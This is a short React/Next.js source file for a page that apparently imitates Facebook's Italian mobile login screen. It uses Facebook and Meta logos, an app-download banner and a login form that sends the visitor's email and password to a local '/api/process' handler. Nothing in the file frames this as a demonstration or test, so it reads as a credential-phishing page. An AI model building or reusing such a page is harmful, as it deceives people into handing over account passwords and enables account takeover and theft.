'use client';

export default function Home() {
  return (
    <main className="fb-container">
      <div className="top-banner">
        <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
      </div>

      <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
      <p className="lang">Italiano</p>

      <form action="/api/process" method="POST" className="fb-form">
        <input type="text" name="email" placeholder="Email" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Invia</button>
      </form>

      <footer className="meta-footer">
        <div className="meta-links">
          <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
          <a href="#">Informazioni</a>
          <a href="#">Centro assistenza</a>
          <a href="#">Altro</a>
        </div>
      </footer>
    </main>
  );
}
